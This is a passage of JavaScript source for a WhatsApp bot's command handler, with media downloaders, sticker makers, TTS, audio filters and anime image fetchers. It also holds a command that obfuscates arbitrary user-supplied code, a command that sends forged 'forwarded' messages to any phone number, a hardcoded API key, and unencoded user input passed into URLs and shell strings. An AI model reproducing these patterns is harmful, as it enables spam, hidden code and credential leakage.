if (!text.startsWith("https://")) return m.reply("Invalid Link")
await Hisoka.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
var anu = await ytdl.ytmp4(`${text}`)

if (anu.status) {
let urlMp3 = anu.download.url
await Hisoka.sendMessage(m.chat, {video: {url: urlMp3}, mimetype: "video/mp4"}, {quoted: m})
} else {
return m.reply("Error! Result Not Found")
}
await Hisoka.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break
case "ytmp3": {
if (!text) return reply(`*Wrong Usage!*\nexample: .ytmp3 (link)`)
if (!text.startsWith("https://")) return m.reply("Invalid Link")
await Hisoka.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})

var anu = await ytdl.ytmp3(`${text}`)

if (anu.status) {
let urlMp3 = anu.download.url
await Hisoka.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg"}, {quoted: m})
} else {
return m.reply("Error! Result Not Found")
}
await Hisoka.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break
case 'gddl':
    case 'gdrive': {
      try {
        if (!text) return m.reply(`*Wrong Usage!*\nexample: .gdrive (link)`)
         await Hisoka.sendMessage(m.chat, {react: {text: '🚀', key: m.key}})
        let hao = await fetchJson(`https://api.siputzx.my.id/api/d/gdrive?url=${text}`)
        let fileName = hao.data.name
        return await Hisoka.sendMessage(m.chat, {
          document: {
            url: hao.data.download
          },
          mimetype: 'application/zip',
          fileName: fileName
        }, {
          quoted: m
        })
      } catch (err) {
        console.error('API Error:', err)
        m.reply('An error occurred')
      }
    }

break
case 'mediafire':
    case 'mfdl': {
      try {
        if (!text) return m.reply(`*Incorrect Usage!*\nexample: .mediafire the_link`)
        if (!text.includes('mediafire.com')) return m.reply('Must be a mediafire link!')
        
        await Hisoka.sendMessage(m.chat, {react: {text: '🚀', key: m.key}})
        let api = await fetchJson(`https://api.vreden.web.id/api/mediafiredl?url=${text}`)
        let data = api.result?.[0]

        let fileNama = decodeURIComponent(data.nama || 'file.zip')
        let extension = fileNama.split('.').pop().toLowerCase()

        let res = await axios.get(data.link, {
          responseType: 'arraybuffer'
        })
        let media = Buffer.from(res.data)

        let mimetype = ''
        if (extension === 'mp4') mimetype = 'video/mp4'
        else if (extension === 'mp3') mimetype = 'audio/mp3'
        else mimetype = `application/${extension}`

        Hisoka.sendMessage(m.chat, {
          document: media,
          fileName: fileNama,
          mimetype: mimetype
        }, {
          quoted: m
        })

      } catch (err) {
        m.reply('An error occurred: ' + err)
      }
    }

break
case 'git': case 'gitclone': {
if (!args[0]) return reply(`*Incorrect Usage!*\nexample: .${command} (link)`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return reply(`Link invalid!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    Hisoka.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => reply("error"))
}
break


//============ Other


case 'getpastebin': 
case 'getpb': {
 if (!text) return reply(`🔗 Enter pastebin link, example:\n.getpb https://pastebin.com/raw/abc123`);

 try {
 const res = await fetch(`https://api.nekorinn.my.id/tools/getpastebin?url=${encodeURIComponent(q)}`);
 const json = await res.json();
 if (!json.status) return reply(`⚠️ Failed to get data from Pastebin.`);

 let content = json.result.content
 .split('\n')
 .filter(line => !line.trim().startsWith('//'))
 .join('\n');

 const isiPreview = content.length > 4000 ? content.slice(0, 4000) + '\n\n📌 Terpotong otomatis.' : content;

 const msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 interactiveMessage: proto.Message.InteractiveMessage.create({
 header: proto.Message.InteractiveMessage.Header.create({
 title: '📄 Pastebin Content',
 subtitle: 'Result from your link',
 hasMediaAttachment: false
 }),
 body: { text: isiPreview },
 footer: { text: `Powered by ${namaBot}` },
 nativeFlowMessage: {
 buttons: [
 {
 name: 'cta_copy',
 buttonParamsJson: JSON.stringify({
 display_text: '📋 Salin Semua Isi',
 copy_code: content.slice(0, 10000)
 })
 }
 ]
 }
 })
 }
 }
 }, { userJid: m.chat, quoted: m });

 await Hisoka.relayMessage(m.chat, msg.message, { messageId: msg.key.id });

 } catch (err) {
 console.error(err);
 cpe(`❌ Error: ${err.message}`);
 }
}
break
case 'ssweb':
case 'ss-web': {
  if (!text) return m.reply(`Example: ${command} beautiful girl with handsome man`)
  
  await Hisoka.sendMessage(m.chat, {image: {url: `https://api.siputzx.my.id/api/tools/ssweb?url=${text}&theme=light&device=desktop` }, caption: foother }, {quoted: m})
}
break
case 'sendchat': {
  if (!text) return m.reply(`Example: ${command} Hai|62xxxx`)
  let [l, r] = text.split`|`
if (!l) l = ''
if (!r) r = ''
  let teks = `📢 *PESAN BARU BUAT ANDA*\n\n`
  teks += `👤 *Sender:* @${m.sender.split('@')[0]}\n`
  teks += `💬 *Message:* ${l}\n`

  // Bot Owner ID (can be more than one)
  const ownerJid = [`${r}@s.whatsapp.net`] // replace with owner number

  for (let id of ownerJid) {
    Hisoka.sendMessage(id,
{ text: teks,
contextInfo:{
mentionedJid:[sender],
isForwarded: true, 
forwardedNewsletterMessageInfo: {
newsletterJid: idch,
newsletterName: `© ${namaBot}`, 
serverId: 200
}, 
externalAdReply: {
title: `© ${namaBot}`, 
thumbnailUrl: `https://files.catbox.moe/${['k3xvf0', '3w0llo', 'pkmiz6', '9gs4q5'][Math.floor(Math.random() * 4)]}.jpg`, 
renderLargerThumbnail: false, 
mediaType: 1, 
previewType: 1, 
sourceUrl: "https://Hisoka-Dev", 
}}
}, {quoted: m })
}


  m.reply('Successfully sent message')
}
break
case 'upch': {
  if (!text) return m.reply(`Example: ${command} Hai`)
  let teks = `\n${text}\n`

  // Bot Owner ID (can be more than one)
  const ownerJid = [`${idch}`] // replace with owner number

  for (let id of ownerJid) {
    Hisoka.sendMessage(id,
{ text: teks,
contextInfo:{
mentionedJid:[sender],
isForwarded: true, 
forwardedNewsletterMessageInfo: {
newsletterJid: idch,
newsletterName: `© ${namaBot}`, 
serverId: 200
}, 
externalAdReply: {
title: `© ${namaBot}`, 
thumbnailUrl: `https://files.catbox.moe/${['k3xvf0', '3w0llo', 'pkmiz6', '9gs4q5'][Math.floor(Math.random() * 4)]}.jpg`, 
renderLargerThumbnail: false, 
mediaType: 1, 
previewType: 1, 
sourceUrl: "https://Hisoka-Dev", 
}}
}, {quoted: m })
}

  m.reply('Successfully sent message')
}
break
async function obfus(query) {
      return new Promise((resolve, reject) => {
        try {
          const obfuscationResult = jsobfus.obfuscate(query, {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
          });
          const result = {
            status: 200,
            author: `${namaBot}`,
            result: obfuscationResult.getObfuscatedCode()
          };
          resolve(result);
        } catch (e) {
          reject(e);
        }
      });
    }
    case "obfus":
      case "enc":
      case "obfuscate":
        {
          if (!q) {
            return reply(`Example ${prefix + command} const xeonbot = require('baileys')`);
          }
          let meg = await obfus(q);
          reply(`${meg.result}`);
        }
        break;
case 'tts': {
 // Panggil modul yang dibutuhkan

 // --- DAFTAR KARAKTER LOKAL YANG KITA KELOLA ---
 // Easy to add or remove characters here
 const ttsCharacters = [
 { displayName: "Optimus Prime", audioKey: "optimus_prime" },
 { displayName: "Hatsune Miku", audioKey: "miku" },
 { displayName: "Nami", audioKey: "nami" },
 { displayName: "Goku", audioKey: "goku" },
 { displayName: "Eminem", audioKey: "eminem" },
 { displayName: "Mickey Mouse", audioKey: "mickey_mouse" }
 ];
 
 const text = args.join(" ");

 try {
 // --- LOGIKA 1: JIKA TIDAK ADA TEKS, TAMPILKAN DAFTAR ---
 if (!text) {
 let responseText = "🎙️ *Daftar Character Suara TTS* 🎙️\n\n";
 responseText += "Use format:\n`.tts character name | text`\n\n";
 responseText += "Example:\n`.tts Goku | Kamehameha!`\n\n";
 responseText += "┌─「 *Pilihan Character* 」\n";
 
 ttsCharacters.forEach(char => {
 responseText += `│ • ${char.displayName}\n`;
 });
 responseText += "└─「 伝説の回廊 」";

 return await reply(responseText);
 }

 // --- LOGIKA 2: JIKA ADA TEKS, BUAT AUDIO ---
 const parts = text.split("|");
 if (parts.length !== 2 || !parts[0].trim() || !parts[1].trim()) {
 return reply("❌ Wrong format.\n\nUse format:\n`.tts character name | text`\n\nType `.tts` to see character list.");
 }

 const characterName = parts[0].trim();
 const speechText = parts[1].trim();
 
 // Find matching character from our local list
 const character = ttsCharacters.find(char => char.displayName.toLowerCase() === characterName.toLowerCase());

 if (!character) {
 return reply(`❌ Character "*${characterName}*" not found. Type `.tts` to see the list.`);
 }

 const maxRetries = 3;
 const retryDelay = 2000;
 let statusMessage = await Hisoka.sendMessage(m.chat, { text: `⏳ Contacting character *${character.displayName}*...` }, { quoted: m });

 for (let attempt = 1; attempt <= maxRetries; attempt++) {
 try {
 await Hisoka.sendMessage(m.chat, { 
 text: `⏳ Mencoba suara *${character.displayName}*... (Percobaan ${attempt}/${maxRetries})`,
 edit: statusMessage.key 
 });

 const apiUrl = `https://flowfalcon.dpdns.org/tools/text-to-speech?text=${encodeURIComponent(speechText)}`;
 const { data: apiResponse } = await axios.get(apiUrl);

 if (!apiResponse.status || !apiResponse.result) throw new Error("API not responding properly.");

 const result = apiResponse.result.find(res => res[character.audioKey]);
 if (!result) throw new Error(`Result for ${character.displayName} not found.`);
 
 const audioUrl = result[character.audioKey];
 if (!audioUrl) throw new Error(`Audio link for ${character.displayName} not found.`);

 await Hisoka.sendMessage(m.chat, { text: `✅ Link found, downloading audio...`, edit: statusMessage.key });

 const { data: audioBuffer } = await axios.get(audioUrl, { responseType: 'arraybuffer' });
 if (!Buffer.isBuffer(audioBuffer) || audioBuffer.length < 1000) throw new Error("Failed to download valid audio.");

 await Hisoka.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg', ptt: true }, { quoted: m });
 await Hisoka.sendMessage(m.chat, { delete: statusMessage.key });
 return;

 } catch (error) {
 console.error(`Attempt ${attempt} for ${character.displayName} failed:`, error.message);
 if (attempt === maxRetries) {
 await Hisoka.sendMessage(m.chat, { text: `❌ Failed completely after ${maxRetries} attempts.\n*Reason:* ${error.message}`, edit: statusMessage.key });
 return;
 }
 await new Promise(resolve => setTimeout(resolve, retryDelay));
 }
 }
 } catch (error) {
 console.error("Error pada fitur TTS:", error);
 reply(`❌ Sorry, a general error occurred. ${error.message}`);
 }
}
break;
case 'removal':
case 'removebg': {
  if (!quoted) return reply(`Where is the photo?`)
if (!/image/.test(mime)) return reply(`Send/Reply Photo With Caption ${prefix + command}`)
HisokaReact()
let media = await Hisoka.downloadAndSaveMediaMessage(quoted);
let response = await CatBox(media);
  await Hisoka.sendMessage(m.chat, {image: {url: `https://api.siputzx.my.id/api/iloveimg/removebg?image=${response}` }, caption: foother }, {quoted: m})
}
break
case 'emojimix': {
let [emoji1, emoji2] = q.split`+`
if (!emoji1) return reply(`\n*Incorrect Usage!*\nType .emojimix 😄+😏\n`)
if (!emoji2) return reply(`\n*Incorrect Usage!*\nType .emojimix 😄+😏\n`)
reply("Proses...")
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await Hisoka.sendImageAsSticker(m.chat, res.url, m, {
packname: foother,
author: nama,
categories: res.tags
})
await fs.unlinkSync(encmedia)
}
 
}

break 
case 'iqc': {
  if (!text) return reply('Mana Text Nya')
  if (text.length > 80) return m.reply('Max 80 Text')
 HisokaReact()
  Hisoka.sendMessage(m.chat, {
    image: { url: 'https://flowfalcon.dpdns.org/imagecreator/iqc?text=' + encodeURIComponent(text) }
  }, { quoted: m })
}
break;
case 'tovn': {
if (!/video/.test(mime) && !/audio/.test(mime)) return m.reply(`Reply video/audio with caption ${prefix + command}`)
if (!quoted) return reply(`Reply video/audio with caption ${prefix + command}`)
//await loading()
var dl = await m.quoted.download()
Hisoka.sendMessage(from, {audio: dl, mimetype: 'audio/mpeg', ptt: true }, {quoted: m })
}
break
case 'toaudio': {
if (!/video/.test(mime) && !/audio/.test(mime)) return m.reply(`Reply video/audio with caption ${prefix + command}`)
if (!quoted) return reply(`Reply video/audio with caption ${prefix + command}`)
//await loading()
var dl = await m.quoted.download()
Hisoka.sendMessage(from, {audio: dl, mimetype: 'audio/mpeg', ptt: false }, {quoted: m })
}
break
case 'readmore':
case 'selengkapnya': {
if (!q) return reply(`enter text example ${command} yourbad|justjoking`)
let [l, r] = text.split`|`
if (!l) l = ''
if (!r) r = ''
reply(l + readmore + r)
}
break 
case 'toimage': case 'toimg': {
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) return reply(`Reply to sticker with caption *${prefix + command}*`)
let media = await Hisoka.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
Hisoka.sendMessage(m.chat, { image: buffer }, {quoted:m})
fs.unlinkSync(ran)
})
}

break 
case 'stickerwm':
case 'wm':
case 'stikerwm':
case 'swm': {
if (!text) return reply("Where is the text?")
if (!/image|video/gi.test(mime)) return m.reply("send media")
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Video duration maximum 15 seconds!")
var image = await Hisoka.downloadAndSaveMediaMessage(qmsg)
await Hisoka.sendImageAsSticker(m.chat, image, m, {packname: text})
await fs.unlinkSync(image)
Hisoka.sendMessage(m.chat, { react: { text: '✅', key: m.key }})
}

break
case 'sticker':
case 'stiker':
case 's': {
if (!/image|video/gi.test(mime)) return m.reply("send media")
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Video duration maximum 15 seconds!")
var image = await Hisoka.downloadAndSaveMediaMessage(qmsg)
await Hisoka.sendImageAsSticker(m.chat, image, m, {packname: foother})
await fs.unlinkSync(image)
Hisoka.sendMessage(m.chat, { react: { text: '✅', key: m.key }})
}

break
case 'smeme': case 'stickermeme': case 'stickmeme': {
await Hisoka.sendMessage(m.chat, {react: {text: '🚀', key: m.key}})
if (!/webp/.test(mime) && /image/.test(mime)) {
if (!text) return m.reply(`Usage: ${prefix + command} text1|text2`)
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
mee = await Hisoka.downloadAndSaveMediaMessage(quoted)
mem = await UploadFileUgu(mee)
meme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem.url}`
memek = await Hisoka.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
} else {
m.reply(`Send/Reply Image With Caption ${prefix + command} text1|text2`)
}
}
break
case "tourl": {
if (!/image/.test(mime)) return reply("send/reply with photo")
let media = await Hisoka.downloadAndSaveMediaMessage(qmsg)
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('pixhost.to');
let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'Hisoka.png');

let teks = directLink.toString()
await Hisoka.sendMessage(m.chat, {text: teks}, {quoted: m})
await fs.unlinkSync(media)
}
break
case 'tourl2': {
                                if (!mime) return reply(`Kirim/Balas Video/Gambar Dengan Caption ${prefix + command}`);
                                try {
                                        let media = await Hisoka.downloadAndSaveMediaMessage(quoted);
                                        if (/image|video/.test(mime)) {
                                                let response = await CatBox(media);
                                                let fileSize = (fs.statSync(media).size / 1024).toFixed(2);
                                                let uploadDate = new Date().toLocaleString();
                                                let uploader = m.pushName;
                                                let caption = `🔗 *Link Media* : ${response}\n📅 *Tanggal Upload* : ${uploadDate}\n📂 *Ukuran File* : ${fileSize} KB\n👤 *Pengunggah* : ${uploader}`.trim();
                                                reply(caption);
                                        } else if (!/image/.test(mime)) {
                                                let response = await CatBox(media);
                                                reply(response);
                                        } else {
                                        reply(`Media type not supported!`);
                                        }
                                        await fs.unlinkSync(media);
                                } catch (err) {
                                        console.log(err);
                                        reply("Oops, an error occurred while uploading media. Please try again! 😅");
                                }
                        }

break ;
case "hdvideo":
case "hdvid": {
    const ffmpeg = require('fluent-ffmpeg');
    const ffmpegStatic = require('ffmpeg-static');
    const { writeFile, unlink, mkdir } = require('fs').promises;
    const { existsSync } = require('fs');
    const path = require('path');

    if (!ffmpegStatic) {
        return Hisoka.sendMessage(m.chat, { text: "❌ FFMPEG not found! Make sure it's installed correctly." }, { quoted: m });
    }
    ffmpeg.setFfmpegPath(ffmpegStatic);
    let inputPath, outputPath;
    try {
        let q = m.quoted || m;
        let mime = q.mimetype || q.msg?.mimetype || q.mediaType || "";
        if (!mime) return Hisoka.sendMessage(m.chat, { text: "❌ Where is the video?" }, { quoted: m });
        if (!/video\/(mp4|mov|avi|mkv)/.test(mime)) {
            return Hisoka.sendMessage(m.chat, { text: `❌ Format ${mime} not supported!` }, { quoted: m });
        }
        Hisoka.sendMessage(m.chat, { text: "⏳ Processing video, please wait around 2-4 minutes..." }, { quoted: m });
        let videoBuffer = await q.download?.();
        if (!videoBuffer) return Hisoka.sendMessage(m.chat, { text: "❌ Failed to download video!" }, { quoted: m });
        let tempDir = path.join(__dirname, 'tmp');
        if (!existsSync(tempDir)) await mkdir(tempDir, { recursive: true });
        inputPath = path.join(tempDir, `input_${Date.now()}.mp4`);
        outputPath = path.join(tempDir, `output_${Date.now()}.mp4`);
        await writeFile(inputPath, videoBuffer);
        await new Promise((resolve, reject) => {
            ffmpeg(inputPath)
                .outputOptions([
                    '-vf', 'scale=iw*1.5:ih*1.5:flags=lanczos,eq=contrast=1:saturation=1.7,hqdn3d=1.5:1.5:6:6,unsharp=5:5:0.8:5:5:0.8',
                    '-r', '60',
                    '-preset', 'faster',
                    '-crf', '25',
                    '-c:v', 'libx264',
                    '-pix_fmt', 'yuv420p',
                    '-c:a', 'aac',
                    '-b:a', '128k'
                ])
                .on('end', resolve)
                .on('error', reject)
                .save(outputPath);
        });
        await Hisoka.sendMessage(m.chat, { 
            video: { url: outputPath },
            caption: "✅ Video quality successfully enhanced!"
        }, { quoted: m });
    } catch (err) {
        console.error("Error HD Video:", err);
        Hisoka.sendMessage(m.chat, { text: "❌ Gagal meningkatkan kualitas video." }, { quoted: m });
    } finally {
        setTimeout(() => {
            if (inputPath) unlink(inputPath).catch(() => {});
            if (outputPath) unlink(outputPath).catch(() => {});
        }, 5000);
    }
}
break
case 'hd':
case 'tohd':
case 'remini': {
if (!quoted) return reply(`Fotonya Mana?`)
if (!/image/.test(mime)) return reply(`Send/Reply Photo With Caption ${prefix + command}`)
await Hisoka.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})

let startTime = Date.now(); 

await reply(`⚠️ Please wait a moment, your process has started...\n\n⏳ This process takes a long time to use, please be patient.`);

if (/remini/.test(command)) cap = `*ᴛʏᴘᴇ :*  sᴜᴘᴇʀʜᴅ \n* ʀᴇsᴜʟᴛ : sᴜᴄᴄᴇss`;
if (/hd/.test(command)) cap = `*ᴛʏᴘᴇ :*  sᴜᴘᴇʀʜᴅ \n* ʀᴇsᴜʟᴛ : sᴜᴄᴄᴇss`;
if (/hdr/.test(command)) cap =  `*ᴛʏᴘᴇ :*  sᴜᴘᴇʀʜᴅ \n* ʀᴇsᴜʟᴛ : sᴜᴄᴄᴇss`;
let media = await Hisoka.downloadAndSaveMediaMessage(quoted);
try {
let catBoxUrl = await CatBox(media);
console.log('CatBox URL:', catBoxUrl);
let anjai = await fetchJson(`https://api.vreden.my.id/api/artificial/hdr?url=${catBoxUrl}&pixel=4`)
let result = anjai.result.data.downloadUrls[0]
Hisoka.sendMessage(m.chat, { image: { url: result }, caption: cap }, { quoted: m })
} catch (error) {
console.error(error);
}
}
    break;
    case 'qcstc':
    case 'stcqc':
    case 'qcstic':
    case 'qc':
    case 'qcstick': {
      if (!args[0]) return m.reply(`Example: ${command} white halo`)
      if (!args[1]) return m.reply(`Example: ${command} white halo`)
      if (text.length > 80) return m.reply(`Maximum 80 characters!`)
      let [color, ...message] = text.split(' ')
      message = m.quoted ? m.quoted : message.join(' ')
      let backgroundColor
      switch (color) {
      case 'pink':
        backgroundColor = '#f68ac9'
        break
      case 'blue':
        backgroundColor = '#6cace4'
        break
      case 'red':
        backgroundColor = '#f44336'
        break
      case 'green':
        backgroundColor = '#4caf50'
        break
      case 'yellow':
        backgroundColor = '#ffeb3b'
        break
      case 'purple':
        backgroundColor = '#9c27b0'
        break
      case 'darkblue':
        backgroundColor = '#0d47a1'
        break
      case 'lightblue':
        backgroundColor = '#03a9f4'
        break
      case 'ash':
        backgroundColor = '#9e9e9e'
        break
      case 'orange':
        backgroundColor = '#ff9800'
        break
      case 'black':
        backgroundColor = '#000000'
        break
      case 'white':
        backgroundColor = '#ffffff'
        break
      case 'teal':
        backgroundColor = '#008080'
        break
      case 'lightpink':
        backgroundColor = '#FFC0CB'
        break
      case 'chocolate':
        backgroundColor = '#A52A2A'
        break
      case 'salmon':
        backgroundColor = '#FFA07A'
        break
      case 'magenta':
        backgroundColor = '#FF00FF'
        break
      case 'tan':
        backgroundColor = '#D2B48C'
        break
      case 'wheat':
        backgroundColor = '#F5DEB3'
        break
      case 'deeppink':
        backgroundColor = '#FF1493'
        break
      case 'fire':
        backgroundColor = '#B22222'
        break
      case 'skyblue':
        backgroundColor = '#00BFFF'
        break
      case 'brightskyblue':
        backgroundColor = '#1E90FF'
        break
      case 'hotpink':
        backgroundColor = '#FF69B4'
        break
      case 'lightskyblue':
        backgroundColor = '#87CEEB'
        break
      case 'seagreen':
        backgroundColor = '#20B2AA'
        break
      case 'darkred':
        backgroundColor = '#8B0000'
        break
      case 'orangered':
        backgroundColor = '#FF4500'
        break
      case 'cyan':
        backgroundColor = '#48D1CC'
        break
      case 'violet':
        backgroundColor = '#BA55D3'
        break
      case 'mossgreen':
        backgroundColor = '#00FF7F'
        break
      case 'darkgreen':
        backgroundColor = '#008000'
        break
      case 'navyblue':
        backgroundColor = '#191970'
        break
      case 'darkorange':
        backgroundColor = '#FF8C00'
        break
      case 'darkpurple':
        backgroundColor = '#9400D3'
        break
      case 'fuchsia':
        backgroundColor = '#FF00FF'
        break
      case 'darkmagenta':
        backgroundColor = '#8B008B'
        break
      case 'darkgray':
        backgroundColor = '#2F4F4F'
        break
      case 'peachpuff':
        backgroundColor = '#FFDAB9'
        break
      case 'darkishgreen':
        backgroundColor = '#BDB76B'
        break
      case 'darkishred':
        backgroundColor = '#DC143C'
        break
      case 'goldenrod':
        backgroundColor = '#DAA520'
        break
      case 'darkishgray':
        backgroundColor = '#696969'
        break
      case 'darkishpurple':
        backgroundColor = '#483D8B'
        break
      case 'gold':
        backgroundColor = '#FFD700'
        break
      case 'silver':
        backgroundColor = '#C0C0C0'
        break
      default:
        return m.reply('That color not found!')
      }
      const username = m.pushName
      const avatar = await Hisoka.profilePictureUrl(m.sender, "image").catch(() => 'https://files.catbox.moe/nwvkbt.png')
      const json = {
        type: 'quote',
        format: 'png',
        backgroundColor,
        width: 512,
        height: 768,
        scale: 2,
        messages: [{
          entities: [],
          avatar: true,
          from: {
            id: 1,
            name: username,
            photo: {
              url: avatar
            }
          },
          text: message,
          replyMessage: {}
        }]
      }
      const response = await axios.post('https://bot.lyo.su/quote/generate', json, {
        headers: {
          'Content-Type': 'application/json'
        }
      })
      const buffer = Buffer.from(response.data.result.image, 'base64')
      Hisoka.sendImageAsSticker(m.chat, buffer, m, {
        packname: packname,
        author: author
      })
    }
    break
// ============Converter
            case 'bass':
                        case 'blown':
                        case 'deep':
                        case 'earrape':
                        case 'fast':
                        case 'fat':
                        case 'nightcore':
                        case 'reverse':
                        case 'robot':
                        case 'slow':
                        case 'smooth':
                        case 'tupai': {
                                try {
                                        let set
                                        if(/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                                        if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                                        if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                                        if (/earrape/.test(command)) set = '-af volume=12'
                                        if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                                        if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                                        if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                                        if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                                        if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                                        if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                                        if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                                        if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                                        if (/audio/.test(mime)) {
                                                await Hisoka.sendMessage(m.chat, {
                                                        react: {
                                                                text: "⏱️",
                                                                key: m.key,
                                                        }
                                                })
                                                let media = await Hisoka.downloadAndSaveMediaMessage(quoted)
                                                let ran = getRandom('.mp3')
                                                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                                                        fs.unlinkSync(media)
                                                        if (err) return m.reply(err)
                                                        let buff = fs.readFileSync(ran)
                                                        Hisoka.sendMessage(m.chat, {
                                                                audio: buff,
                                                                mimetype: 'audio/mpeg'
                                                        }, {
                                                                quoted: m
                                                        })
                                                        fs.unlinkSync(ran)
                                                })
                                        } else m.reply(`Reply to the audio you want to convert with caption *${prefix + command}*`)
                                } catch (error) {
                                         
                                }
                        }
                        break
                        
    
    //============ Anime
    case 'akiyama':
    case 'ana':
    case 'art':
    case 'asuna':
    case 'ayuzawa':
    case 'boruto':
    case 'bts':
    case 'cartoon':
    case 'chiho':
    case 'chitoge':
    case 'cosplay':
    case 'cosplayloli':
    case 'cosplaysagiri':
    case 'cyber':
    case 'deidara':
    case 'doraemon':
    case 'elaina':
    case 'emilia':
    case 'erza':
    case 'exo':
    case 'gamewallpaper':
    case 'gremory':
    case 'hacker':
    case 'hestia':
    case 'hinata':
    case 'husbu':
    case 'inori':
    case 'islamic':
    case 'isuzu':
    case 'itachi':
    case 'itori':
    case 'jennie':
    case 'jiso':
    case 'justina':
    case 'kaga':
    case 'kagura':
    case 'kakasih':
    case 'kaori':
    case 'keneki':
    case 'kotori':
    case 'kurumi':
    case 'lisa':
    case 'madara':
    case 'megumin':
    case 'mikasa':
    case 'mikey':
    case 'miku':
    case 'minato':
    case 'mountain':
    case 'naruto':
    case 'neko2':
    case 'nekonime':
    case 'nezuko':
    case 'onepiece':
    case 'pentol':
    case 'pokemon':
    case 'programming':
    case 'randomnime':
    case 'randomnime2':
    case 'rize':
    case 'rose':
    case 'sagiri':
    case 'sakura':
    case 'sasuke':
    case 'satanic':
    case 'shina':
    case 'shinka':
    case 'shinomiya':
    case 'shizuka':
    case 'shota':
    case 'shortquote':
    case 'space':
    case 'technology':
    case 'tejina':
    case 'toukachan':
    case 'tsunade':
    case 'yotsuba':
    case 'yuki':
    case 'yulibocil':
    case 'yumeko': {
      m.reply("Loading 🔁")
      let heyy
      if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/akiyama.json')
      if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/ana.json')
      if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/art.json')
      if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/asuna.json')
      if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/ayuzawa.json')
      if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/boneka.json')
      if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/boruto.json')
      if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/bts.json')
      if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/cecan.json')
      if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/chiho.json')
      if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/chitoge.json')
      if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/cogan.json')
      if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/cosplay.json')
      if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/cosplayloli.json')
      if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/cosplaysagiri.json')
      if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/cyber.json')
